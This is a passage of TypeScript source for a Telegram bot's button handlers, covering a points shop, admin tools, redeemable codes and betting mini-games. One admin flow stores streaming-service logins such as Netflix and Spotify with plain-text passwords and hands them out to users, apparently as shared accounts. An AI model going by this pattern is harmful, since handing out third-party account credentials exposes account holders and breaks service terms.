        await bot.sendMessage(chatId, `✅ Thank you! You rated <b>${esc(itemName)}</b> ${starsStr} (${ratingVal}/5)`, { parse_mode: "HTML" });
        if (OWNER_ID) {
          try {
            await bot.sendMessage(OWNER_ID,
              `⭐ <b>New Account Rating</b>\n${"─".repeat(30)}\n\n👤 @${esc(username)} (<code>${tgUserId}</code>)\n🎁 Item: ${esc(itemName)}\n⭐ Rating: ${starsStr} (${ratingVal}/5)\n📦 Source: ${source}`,
              { parse_mode: "HTML" }
            );
          } catch {}
        }
        return;
      }

      if (query.data === "out_of_stock") {
        return bot.answerCallbackQuery(query.id, { text: "❌ This item is out of stock!", show_alert: true });
      }

      if (query.data?.startsWith("buy_item:")) {
        await bot.answerCallbackQuery(query.id, { text: "Processing..." });
        const itemId = query.data.split(":")[1];
        const user = await storage.getUserByTelegramId(String(tgUserId)) || await storage.getUserByUsername(tgUsername);
        if (!user) return bot.sendMessage(chatId, "Please use /start first.");
        if (user.isBanned) return bot.sendMessage(chatId, "⛔ You are banned.");
        const item = await storage.getItem(itemId);
        if (!item) return bot.answerCallbackQuery(query.id, { text: "Item not found.", show_alert: true });
        const availableCode = await storage.getAvailableCode(itemId);
        if (!availableCode) return bot.answerCallbackQuery(query.id, { text: "❌ Out of stock!", show_alert: true });
        const isOwnerBuy = isBotOwner(tgUserId);
        if (!isOwnerBuy && user.points < item.price) {
          return bot.answerCallbackQuery(query.id, { text: `❌ Insufficient Points\nYou need: ${item.price}\nYou have: ${user.points}`, show_alert: true });
        }
        const claimedCode = await storage.claimCode(availableCode.id, user.id);
        if (!isOwnerBuy) await storage.deductPoints(user.id, item.price);
        const remaining = await storage.getAvailableCodeCount(itemId);
        await storage.updateItem(itemId, { stock: remaining });
        if (remaining > 0 && remaining <= 3) {
          await notifyOwner(`⚠️ Low Stock Alert!\n\n🎁 Item: ${esc(item.name)}\n📦 Remaining: ${remaining} code(s)`);
        } else if (remaining === 0) {
          await notifyOwner(`🚨 OUT OF STOCK!\n\n🎁 Item: ${esc(item.name)}\n📦 Remaining: 0`);
        }
        await storage.createPurchase(user.id, itemId, claimedCode.code);
        addLog("purchase", tgUsername, String(tgUserId), `Bought ${item.name} for ${item.price} pts`);
        await handlePurchase(chatId, tgUserId, user, item, claimedCode);
        return;
      }

      if (query.data === "ax_add_start") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        return bot.sendMessage(chatId,
          `➕ <b>Add Account</b>\n${"─".repeat(30)}\n\nChoose how to add:`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "1️⃣ Single Account", callback_data: "ax_add_single" }],
                [{ text: "📦 Bulk (Same Label)", callback_data: "ax_add_bulk" }],
                [{ text: "📋 Bulk (Direct List)", callback_data: "ax_add_bulk_direct" }],
              ],
            },
          }
        );
      }

      if (query.data === "ax_add_single") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        pending[tgUserId] = { action: "ax_single_label" };
        return bot.sendMessage(chatId,
          `➕ <b>Add Account</b>\n${"─".repeat(30)}\n\n` +
          `🏷 <b>Send the label first:</b>\n\n` +
          `<b>Example:</b> <code>Netflix</code> or <code>Disney</code>\n\n` +
          `Send label or /cancel:`,
          { parse_mode: "HTML" }
        );
      }

      if (query.data === "ax_add_bulk") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        pending[tgUserId] = { action: "ax_bulk_label" };
        return bot.sendMessage(chatId,
          `📦 <b>Bulk Add Accounts</b>\n${"─".repeat(30)}\n\n` +
          `📝 <b>Step 1/2</b> — Enter the <b>Label</b> for all accounts\n\n` +
          `💡 Example: <code>Netflix Premium</code>\n\n` +
          `Type the label or /cancel:`,
          { parse_mode: "HTML" }
        );
      }

      if (query.data === "ax_add_bulk_direct") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        pending[tgUserId] = { action: "ax_bulk_direct" };
        return bot.sendMessage(chatId,
          `📦 <b>Bulk Add — Quick Mode</b>\n${"─".repeat(30)}\n\n` +
          `📝 Send all accounts, one per line:\n\n` +
          `<b>Format:</b>\n` +
          `<code>label | email | password</code>\n\n` +
          `<b>Example:</b>\n` +
          `<code>Netflix | user1@mail.com | pass123\nNetflix | user2@mail.com | pass456\nSpotify | user3@mail.com | mypass</code>\n\n` +
          `💡 Or without password:\n` +
          `<code>Netflix | user@mail.com</code>\n\n` +
          `Send your list or /cancel:`,
          { parse_mode: "HTML" }
        );
      }

      if (query.data === "ax_add_nopass") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        const state = pending[tgUserId];
        if (!state || state.action !== "ax_add_password") return;

        const label = state.ax_label;
        const email = state.ax_email;
        delete pending[tgUserId];

        const redeemCode = crypto.randomBytes(4).toString("hex").toUpperCase();
        await storage.createAnimatrixCode({ code: redeemCode, email, password: "", label });

        return bot.sendMessage(chatId,
          `✅ <b>Account Added Successfully!</b>\n` +
          `${"═".repeat(30)}\n\n` +
          `🏷 <b>Label:</b> ${esc(label)}\n` +
          `📧 <b>Account:</b> <code>${esc(email)}</code>\n` +
          `🔐 <b>Password:</b> —\n` +
          `🎫 <b>Redeem Code:</b> <code>${esc(redeemCode)}</code>\n\n` +
          `${"─".repeat(30)}\n` +
          `📋 <b>User Command:</b>\n<code>/animatrix ${esc(redeemCode)}</code>\n\n` +
          `💡 Share the code above with the user.`,
          { parse_mode: "HTML" }
        );
      }

      // Animatrix Panel Buttons
      if (query.data === "ax_list") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        const allCodes = await storage.getAllAnimatrixCodes();
        const available = allCodes.filter(c => !c.isUsed);
        const used = allCodes.filter(c => c.isUsed);
        if (!allCodes.length) return bot.sendMessage(chatId, "🗂 No codes available yet.");
        let msg2 = `🗂 <b>Code List</b>\n\n✅ Available: ${available.length} | ⛔ Used: ${used.length}\n${"─".repeat(30)}\n\n`;
        if (available.length > 0) {
          msg2 += `🟢 <b>Available:</b>\n`;
          for (const c of available.slice(0, 20)) {
            const lbl = c.label ? ` [${esc(c.label)}]` : "";
            msg2 += `• <code>${esc(c.code)}</code>${lbl} — ${esc(c.email || "-")}\n`;
          }
          if (available.length > 20) msg2 += `<i>...and ${available.length - 20} more</i>\n`;
        }
        if (used.length > 0) {
          msg2 += `\n🔴 <b>Used:</b>\n`;
          for (const c of used.slice(0, 10)) {
            msg2 += `• <code>${esc(c.code)}</code> — by @${esc(c.usedByUsername || "Unknown")}\n`;
          }
          if (used.length > 10) msg2 += `<i>...and ${used.length - 10} more</i>\n`;
        }
        return bot.sendMessage(chatId, msg2, { parse_mode: "HTML" });
      }

      if (query.data === "ax_stats") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        const allCodes = await storage.getAllAnimatrixCodes();
        const available = allCodes.filter(c => !c.isUsed);
        const used = allCodes.filter(c => c.isUsed);
        const redemptions = await storage.getAnimatrixRedemptions();
        const labels: Record<string, { total: number; used: number }> = {};
        for (const c of allCodes) {
          const lbl = c.label || "Unlabeled";
          if (!labels[lbl]) labels[lbl] = { total: 0, used: 0 };
          labels[lbl].total++;
          if (c.isUsed) labels[lbl].used++;
        }
        let msg2 = `📊 <b>Animatrix Statistics</b>\n${"─".repeat(30)}\n\n🎫 Total Codes: <b>${allCodes.length}</b>\n✅ Available: <b>${available.length}</b>\n⛔ Used: <b>${used.length}</b>\n📋 Redemptions: <b>${redemptions.length}</b>\n`;
        const lblEntries = Object.entries(labels);
        if (lblEntries.length > 0) {
          msg2 += `\n🏷 <b>By Label:</b>\n`;
          for (const [lbl, data] of lblEntries) {
            msg2 += `• ${esc(lbl)}: ${data.total - data.used} available / ${data.used} used\n`;
          }
        }
        return bot.sendMessage(chatId, msg2, { parse_mode: "HTML" });
      }

      // FIX: ax_broadcast handler
      if (query.data === "ax_broadcast") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        pending[Number(tgUserId)] = { action: "broadcast" };
        return bot.sendMessage(chatId, "📢 Send the message you want to broadcast to all users:");
      }

      // FIX: ax_users handler
      if (query.data === "ax_users") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        const allUsers = await storage.getAllUsers();
        let msg2 = `👥 Users (${allUsers.length})\n\n`;
        allUsers.slice(0, 20).forEach((u: any, i: number) => {
          msg2 += `${i + 1}. @${u.username} — 💰${u.points} pts${u.isBanned ? " 🚫BANNED" : ""}\n`;
        });
        if (allUsers.length > 20) msg2 += `\n... and ${allUsers.length - 20} more.`;
        return bot.sendMessage(chatId, msg2, adminMenu());
      }

      // FIX: ax_addadmin handler
      if (query.data === "ax_addadmin") {
        if (!isBotOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Owner only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        pending[Number(tgUserId)] = { action: "add_admin" };
        return bot.sendMessage(chatId, "➕ Send the Telegram ID of the user to add as admin:");
      }

      // FIX: ax_removeadmin handler
      if (query.data === "ax_removeadmin") {
        if (!isBotOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Owner only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        pending[Number(tgUserId)] = { action: "remove_admin" };
        return bot.sendMessage(chatId, "🗑 Send the Telegram ID of the admin to remove:");
      }

      // FIX: ax_ban handler
      if (query.data === "ax_ban") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        pending[Number(tgUserId)] = { action: "ban_user" };
        return bot.sendMessage(chatId, "🚫 Send: @username|reason\n\nExample: @spammer|Spamming");
      }

      // FIX: ax_unban handler
      if (query.data === "ax_unban") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        pending[Number(tgUserId)] = { action: "unban_user" };
        return bot.sendMessage(chatId, "✅ Send the username to unban:\n\nExample: @ahmed");
      }

      // FIX: ax_help handler
      if (query.data === "ax_help") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        return bot.sendMessage(chatId,
          `🔧 <b>Animatrix Help</b>\n${"─".repeat(30)}\n\n` +
          `<b>Add account with email+password:</b>\n<code>/animatrix LABEL EMAIL PASSWORD</code>\n\n` +
          `<b>Add account with code:</b>\n<code>/animatrix LABEL CODE</code>\n\n` +
          `<b>User redemption:</b>\n<code>/animatrix REDEEMCODE</code>`,
          { parse_mode: "HTML" }
        );
      }

      if (query.data === "reset_points_confirm1") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        try { await bot.editMessageText(
          `🚨🚨 <b>FINAL WARNING</b> 🚨🚨\n${"─".repeat(30)}\n\nThis action CANNOT be undone!\nALL users will lose ALL their points!\n\nAre you REALLY sure?`,
          { chat_id: chatId, message_id: messageId, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🚨 YES, RESET ALL POINTS", callback_data: "reset_points_confirm2" }], [{ text: "❌ Cancel", callback_data: "reset_points_cancel" }]] } }
        ); } catch {}
        return;
      }

      if (query.data === "reset_points_confirm2") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        const count = await storage.resetAllPoints();
        try { await bot.editMessageText(
          `✅ <b>Points Reset Complete!</b>\n${"─".repeat(30)}\n\n🔄 ${count} user(s) had their points reset to 0.`,
          { chat_id: chatId, message_id: messageId, parse_mode: "HTML" }
        ); } catch {}
        return;
      }

      if (query.data === "reset_points_cancel") {
        await bot.answerCallbackQuery(query.id, { text: "Cancelled!" });
        try { await bot.editMessageText(
          `❌ <b>Reset Cancelled</b>\n\nNo points were changed.`,
          { chat_id: chatId, message_id: messageId, parse_mode: "HTML" }
        ); } catch {}
        return;
      }

      if (query.data === "ax_del_prompt") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        pending[Number(tgUserId)] = { action: "ax_delete_code" };
        return bot.sendMessage(chatId, `🗑 <b>Delete Code</b>\n\nSend the code you want to delete:`, { parse_mode: "HTML" });
      }

      if (query.data === "ax_redemptions") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        const redemptions = await storage.getAnimatrixRedemptions();
        if (!redemptions.length) return bot.sendMessage(chatId, "📋 No redemptions yet.");
        let msg2 = `📋 <b>Redemption History</b>\n${"─".repeat(30)}\n\n`;
        for (const r of redemptions.slice(-20).reverse()) {
          const date = new Date(r.redeemedAt).toLocaleString();
          msg2 += `• @${esc(r.username)} — <code>${esc(r.code)}</code> [${esc(r.label || "-")}] — ${date}\n`;
        }
        if (redemptions.length > 20) msg2 += `<i>...and ${redemptions.length - 20} more</i>\n`;
        return bot.sendMessage(chatId, msg2, { parse_mode: "HTML" });
      }

      // Reply to ticket
      if (query.data?.startsWith("reply_ticket:")) {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        const ticketId = query.data.split(":")[1];
        pending[Number(tgUserId)] = { action: "reply_ticket", data: { ticketId } };
        return bot.sendMessage(chatId, `📝 Type your reply to this ticket:`, { parse_mode: "HTML" });
      }

      // Game menu callbacks
      if (query.data?.startsWith("game_select:")) {
        const isAdminUser = await isAdminOrOwner(tgUserId);
        if (!isGameEnabled && !isAdminUser) {
          return bot.answerCallbackQuery(query.id, { text: "⛔ Games are currently disabled!", show_alert: true });
        }
        await bot.answerCallbackQuery(query.id);
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        const gameType = query.data.split(":")[1];
        const uInfo = await storage.getUserByTelegramId(String(tgUserId));
        const gameNames: Record<string, string> = {
          dice: "🎲 Dice Roll", coin: "🪙 Coin Flip", spin: "🎰 Lucky Spin",
          blackjack: "🃏 Blackjack", horse: "🏇 Horse Race", boxing: "🥊 Boxing",
          basketball: "🏀 Basketball", numguess: "🔢 Number Guess", roulette: "🔫 Russian Roulette", rps: "✊ Rock Paper Scissors",
        };
        return bot.sendMessage(chatId,
          `${gameNames[gameType] || "🎮 Game"}\n${"─".repeat(30)}\n\n` +
          `Choose your bet level:\n` +
          `🟢 Easy: Bet 1, Win 2 (40% chance)\n` +
          `🟡 Medium: Bet 3, Win 6 (35% chance)\n` +
          `🔴 Hard: Bet 5, Win 12 (30% chance)\n\n` +
          `💰 General Points: ${isBotOwner(tgUserId) ? "∞" : String(uInfo?.points || 0)}\n🎮 Game Points: ${isBotOwner(tgUserId) ? "∞" : String(uInfo?.gamePoints || 0)}`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "🟢 Easy (1)", callback_data: `play:${gameType}:1` },
                  { text: "🟡 Med (3)", callback_data: `play:${gameType}:3` },
                  { text: "🔴 Hard (5)", callback_data: `play:${gameType}:5` },
                ],
                [{ text: "🔙 Back to Games", callback_data: "game_back" }],
              ],
            },
          }
        );
      }

      if (query.data === "game_back") {
        await bot.answerCallbackQuery(query.id);
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        const uInfo = await storage.getUserByTelegramId(String(tgUserId));
        return bot.sendMessage(chatId,
          `🎮 Game Center\n${"─".repeat(30)}\n\n💰 General Points: ${isBotOwner(tgUserId) ? "∞" : String(uInfo?.points || 0)}\n🎮 Game Points: ${isBotOwner(tgUserId) ? "∞" : String(uInfo?.gamePoints || 0)}\n\nChoose a game to play:`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "🎲 Dice Roll", callback_data: "game_select:dice" }, { text: "🪙 Coin Flip", callback_data: "game_select:coin" }],
                [{ text: "🎰 Lucky Spin", callback_data: "game_select:spin" }, { text: "🃏 Blackjack", callback_data: "game_select:blackjack" }],
                [{ text: "🏇 Horse Race", callback_data: "game_select:horse" }, { text: "🥊 Boxing", callback_data: "game_select:boxing" }],
                [{ text: "🏀 Basketball", callback_data: "game_select:basketball" }, { text: "🔢 Number Guess", callback_data: "game_select:numguess" }],
                [{ text: "🔫 Russian Roulette", callback_data: "game_select:roulette" }],
                [{ text: "❌ Close", callback_data: "game_cancel" }],
              ],
            },
          }
        );
      }

      if (query.data?.startsWith("play:")) {
        const isAdminUser = await isAdminOrOwner(tgUserId);
        if (!isGameEnabled && !isAdminUser) {
          return bot.answerCallbackQuery(query.id, { text: "⛔ Games are currently disabled!", show_alert: true });
        }
        await bot.answerCallbackQuery(query.id);
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        const [, gameType, betStr] = query.data.split(":");
        const betAmount = parseInt(betStr) || 0;
        await startInteractiveGame(chatId, tgUserId, gameType, betAmount);
        return;
      }

      if (query.data === "game_cancel") {
        await bot.answerCallbackQuery(query.id, { text: "Game cancelled" });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        return;
      }

      // Interactive game choice handlers
      if (query.data?.startsWith("gc:")) {
        const isAdminUser = await isAdminOrOwner(tgUserId);
        if (!isGameEnabled && !isAdminUser) {
          return bot.answerCallbackQuery(query.id, { text: "⛔ Games are currently disabled!", show_alert: true });
        }
        await bot.answerCallbackQuery(query.id);
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        const parts = query.data.split(":");
        const gameType = parts[1];
        const choice = parts[2];
        const betAmount = parseInt(parts[3]) || 1;
        const delay = (ms: number) => new Promise(r => setTimeout(r, ms));

        const user = await storage.getUserByTelegramId(String(tgUserId));
        if (!user) return bot.sendMessage(chatId, "Please use /start first.");

        if (gameType === "rps") {
          const canDeduct = await deductBet(user, betAmount);
          if (!canDeduct) return bot.sendMessage(chatId, `❌ Insufficient Points!`);
          const moves = ["rock", "paper", "scissors"];
          const emojiMap: Record<string, string> = { rock: "🪨", paper: "📄", scissors: "✂️" };
          const botChoice = moves[Math.floor(Math.random() * moves.length)];
          await bot.sendMessage(chatId, `✊ You chose ${emojiMap[choice]} ${choice}\n\n🤖 Bot is choosing...`);
          await delay(1500);
          let won = false;
          if (choice === botChoice) {
            await deductBet({ ...user, telegramId: "refund" }, 0);
            const refUser = await storage.getUserByTelegramId(String(tgUserId));
            if (refUser && !isBotOwner(tgUserId)) await storage.addGamePoints(refUser.id, betAmount);
            await bot.sendMessage(chatId,
              `✊ Rock Paper Scissors\n${"─".repeat(30)}\n\n` +
              `You: ${emojiMap[choice]} ${choice}\nBot: ${emojiMap[botChoice]} ${botChoice}\n\n🤝 It's a TIE! Bet refunded.`,
              { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔄 Play Again", callback_data: `play:rps:${betAmount}` }], [{ text: "🔙 Back", callback_data: "game_back" }]] } }
            );
            return;
          }
          won = (choice === "rock" && botChoice === "scissors") || (choice === "paper" && botChoice === "rock") || (choice === "scissors" && botChoice === "paper");
          const visual = `You: ${emojiMap[choice]} ${choice}\nBot: ${emojiMap[botChoice]} ${botChoice}\n\n${won ? "🎉 You beat the bot!" : "😢 Bot wins!"}`;
          await resolveGameResult(chatId, tgUserId, "rps", betAmount, won, visual);
          return;
        }

        if (gameType === "coin") {
          const canDeduct = await deductBet(user, betAmount);
          if (!canDeduct) return bot.sendMessage(chatId, `❌ Insufficient Points!`);
          await bot.sendMessage(chatId, `🪙 You called: ${choice === "heads" ? "👑 Heads" : "🔢 Tails"}\n\n🪙 Flipping the coin...`);
          await delay(2000);
          const result = Math.random() < 0.5 ? "heads" : "tails";
          const won = choice === result;
          const visual = `🪙 The coin landed on: <b>${result === "heads" ? "👑 Heads" : "🔢 Tails"}</b>\nYou called: <b>${choice === "heads" ? "👑 Heads" : "🔢 Tails"}</b>\n\n${won ? "🎉 Correct call!" : "😢 Wrong call!"}`;
          await resolveGameResult(chatId, tgUserId, "coin", betAmount, won, visual);
          return;
        }

        if (gameType === "numguess") {
          const canDeduct = await deductBet(user, betAmount);
          if (!canDeduct) return bot.sendMessage(chatId, `❌ Insufficient Points!`);
          const userGuess = parseInt(choice);
          const secret = Math.floor(Math.random() * 10) + 1;
          await bot.sendMessage(chatId, `🔢 You guessed: <b>${userGuess}</b>\n\n🤔 Revealing the secret number...`, { parse_mode: "HTML" });
          await delay(2000);
          const diff = Math.abs(userGuess - secret);
          const won = diff === 0;
          const close = diff <= 1 && !won;
          let visual = `🔢 Secret number: <b>${secret}</b>\nYour guess: <b>${userGuess}</b>\n\n`;
          if (won) visual += "🎯 PERFECT GUESS! You nailed it!";
          else if (close) visual += `😬 So close! Off by just ${diff}!`;
          else visual += `😢 Not this time! Off by ${diff}.`;
          await resolveGameResult(chatId, tgUserId, "numguess", betAmount, won, visual);
          return;
        }

        if (gameType === "horse") {
          const canDeduct = await deductBet(user, betAmount);
          if (!canDeduct) return bot.sendMessage(chatId, `❌ Insufficient Points!`);
          const horses = ["⚡ Thunder", "🌩 Lightning", "🌪 Storm", "🔥 Blaze", "👤 Shadow"];
          const picked = parseInt(choice);
          const yourHorse = horses[picked];
          await bot.sendMessage(chatId, `🏇 You picked: ${yourHorse}\n\n🏁 The race is starting...`);
          await delay(1000);
          const positions = horses.map(() => 0);
          for (let round = 1; round <= 3; round++) {
            for (let i = 0; i < 5; i++) positions[i] += Math.floor(Math.random() * 4) + 1;
            let raceVisual = `🏇 Race — Lap ${round}/3\n${"─".repeat(25)}\n`;
            const sorted = horses.map((h, i) => ({ name: h, pos: positions[i], idx: i })).sort((a, b) => b.pos - a.pos);
            sorted.forEach((h, rank) => {
              const bar = "▓".repeat(Math.min(h.pos, 15));
              const marker = h.idx === picked ? " ← YOU" : "";
              raceVisual += `${rank + 1}. ${h.name} ${bar}${marker}\n`;
            });
            await bot.sendMessage(chatId, raceVisual);
            if (round < 3) await delay(1500);
          }
          await delay(1000);
          const maxPos = Math.max(...positions);
          const winnerIdx = positions.indexOf(maxPos);
          const won = winnerIdx === picked;
          const visual = `🏁 RACE FINISHED!\n\n🥇 Winner: ${horses[winnerIdx]}\n🏇 Your horse: ${yourHorse}\n\n${won ? "🎉 Your horse won the race!" : "😢 Your horse didn't win."}`;
          await resolveGameResult(chatId, tgUserId, "horse", betAmount, won, visual);
          return;
        }

        if (gameType === "roulette") {
          const canDeduct = await deductBet(user, betAmount);
          if (!canDeduct) return bot.sendMessage(chatId, `❌ Insufficient Points!`);
          const userChamber = parseInt(choice);
          const bulletChamber = Math.floor(Math.random() * 6) + 1;
          await bot.sendMessage(chatId, `🔫 You picked chamber <b>${userChamber}</b>\n\n🔄 Spinning the cylinder...`, { parse_mode: "HTML" });
          await delay(2000);
          await bot.sendMessage(chatId, `🔫 Click...`);
          await delay(1500);
          const won = userChamber !== bulletChamber;
          const visual = won
            ? `🔫 Chamber ${userChamber}: EMPTY!\n💀 Bullet was in chamber ${bulletChamber}\n\n🎉 You survived! Lucky!`
            : `🔫 Chamber ${userChamber}: 💥 BANG!\n\n😢 Game over! The bullet got you.`;
          await resolveGameResult(chatId, tgUserId, "roulette", betAmount, won, visual);
          return;
        }

        if (gameType === "boxing") {
          const canDeduct = await deductBet(user, betAmount);
          if (!canDeduct) return bot.sendMessage(chatId, `❌ Insufficient Points!`);
          const styles: Record<string, string> = { aggressive: "👊 Aggressive", defensive: "🛡 Defensive", counter: "⚡ Counter" };
          await bot.sendMessage(chatId, `🥊 Boxing Match\nYour style: ${styles[choice] || choice}\n\n🔔 Round 1 — FIGHT!`);
          await delay(1500);
          const { chance } = getWinConfig(betAmount);
          let playerHP = 100, botHP = 100;
          const rounds = Math.floor(Math.random() * 3) + 2;
          for (let r = 1; r <= rounds; r++) {
            const playerDmg = Math.floor(Math.random() * 25) + 10;
            const botDmg = Math.floor(Math.random() * 25) + 5;
            botHP -= playerDmg;
            playerHP -= botDmg;
            const bar = (hp: number) => "🟩".repeat(Math.max(0, Math.floor(hp / 10))) + "🟥".repeat(Math.max(0, 10 - Math.floor(hp / 10)));
            await bot.sendMessage(chatId,
              `🥊 Round ${r}\n` +
              `You hit for ${playerDmg} dmg!\nOpponent hits for ${botDmg} dmg!\n\n` +
              `You: ${bar(Math.max(0, playerHP))} ${Math.max(0, playerHP)}HP\n` +
              `Bot: ${bar(Math.max(0, botHP))} ${Math.max(0, botHP)}HP`
            );
            if (r < rounds) await delay(1500);
          }
          await delay(1000);
          const won = Math.random() < chance;
          const visual = won
            ? `🥊 💥 KNOCKOUT!\n\nYou land a devastating ${styles[choice] || ""} combo!\n🏆 You win the fight!`
            : `🥊 💥 TKO!\n\nOpponent catches you with a counter!\n😢 You lost the fight.`;
          await resolveGameResult(chatId, tgUserId, "boxing", betAmount, won, visual);
          return;
        }

        if (gameType === "bj") {
          const state = gameState[tgUserId];
          if (!state || !state.choice) {
            return bot.sendMessage(chatId, "❌ Game session expired. Start a new game.", { reply_markup: { inline_keyboard: [[{ text: "🔙 Back to Games", callback_data: "game_back" }]] } });
          }
          const bjData = JSON.parse(state.choice);
          const cards = ["A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K"];
          const suits = ["♠️", "♥️", "♦️", "♣️"];
          const randCard = () => {
            const c = cards[Math.floor(Math.random() * cards.length)];
            const s = suits[Math.floor(Math.random() * suits.length)];
            const val = c === "A" ? 11 : ["J","Q","K"].includes(c) ? 10 : parseInt(c);
            return { name: `${c}${s}`, value: val };
          };
          const calcTotal = (cardsList: any[]) => {
            let total = cardsList.reduce((s: number, c: any) => s + c.value, 0);
            let aces = cardsList.filter((c: any) => c.name.startsWith("A")).length;
            while (total > 21 && aces > 0) { total -= 10; aces--; }
            return total;
          };

          if (choice === "hit") {
            const newCard = randCard();
            bjData.playerCards.push(newCard);
            bjData.playerTotal = calcTotal(bjData.playerCards);
            const cardStr = bjData.playerCards.map((c: any) => c.name).join("  ");

            if (bjData.playerTotal > 21) {
              delete gameState[tgUserId];
              const canDeduct = await deductBet(user, betAmount);
              const visual = `🃏 Your cards: ${cardStr} = <b>${bjData.playerTotal}</b>\n\n💥 BUST! You went over 21!`;
              await resolveGameResult(chatId, tgUserId, "blackjack", betAmount, false, visual);
              return;
            }

            if (bjData.playerTotal === 21) {
              gameState[tgUserId] = { ...state, choice: JSON.stringify(bjData) };
              delete gameState[tgUserId];
              const canDeduct = await deductBet(user, betAmount);
              let dealerTotal = calcTotal(bjData.dealerCards);
              while (dealerTotal < 17) { bjData.dealerCards.push(randCard()); dealerTotal = calcTotal(bjData.dealerCards); }
              const dealerStr = bjData.dealerCards.map((c: any) => c.name).join("  ");
              const won = dealerTotal > 21 || bjData.playerTotal > dealerTotal;
              const visual = `🃏 Your cards: ${cardStr} = <b>21!</b>\n🤖 Dealer: ${dealerStr} = <b>${dealerTotal}</b>${dealerTotal > 21 ? " BUST!" : ""}\n\n${won ? "🎉 You win!" : dealerTotal === 21 ? "🤝 Push!" : "😢 Dealer wins!"}`;
              await resolveGameResult(chatId, tgUserId, "blackjack", betAmount, won, visual);
              return;
            }

            gameState[tgUserId] = { ...state, choice: JSON.stringify(bjData) };
            return bot.sendMessage(chatId,
              `🃏 Blackjack\n${"─".repeat(30)}\n\n` +
              `Your cards: ${cardStr} = <b>${bjData.playerTotal}</b>\n` +
              `Dealer shows: ${bjData.dealerCards[0].name}  🂠\n\n` +
              `Hit or Stand?`,
              {
                parse_mode: "HTML",
                reply_markup: {
                  inline_keyboard: [
                    [{ text: "🃏 Hit", callback_data: `gc:bj:hit:${betAmount}` }, { text: "✋ Stand", callback_data: `gc:bj:stand:${betAmount}` }],
                  ],
                },
              }
            );
          }

          if (choice === "stand") {
            delete gameState[tgUserId];
            const canDeduct = await deductBet(user, betAmount);
            const cardStr = bjData.playerCards.map((c: any) => c.name).join("  ");
            let dealerTotal = calcTotal(bjData.dealerCards);
            await bot.sendMessage(chatId, `✋ You stand at <b>${bjData.playerTotal}</b>\n\n🤖 Dealer reveals...`, { parse_mode: "HTML" });
            await delay(1500);
            while (dealerTotal < 17) {
              const nc = randCard();
              bjData.dealerCards.push(nc);
              dealerTotal = calcTotal(bjData.dealerCards);
            }
            const dealerStr = bjData.dealerCards.map((c: any) => c.name).join("  ");
            const won = dealerTotal > 21 || bjData.playerTotal > dealerTotal;
            const tie = bjData.playerTotal === dealerTotal;
            let visual = `🃏 Your cards: ${cardStr} = <b>${bjData.playerTotal}</b>\n🤖 Dealer: ${dealerStr} = <b>${dealerTotal}</b>${dealerTotal > 21 ? " BUST!" : ""}\n\n`;
            if (tie) {
              visual += "🤝 It's a Push! Bet returned.";
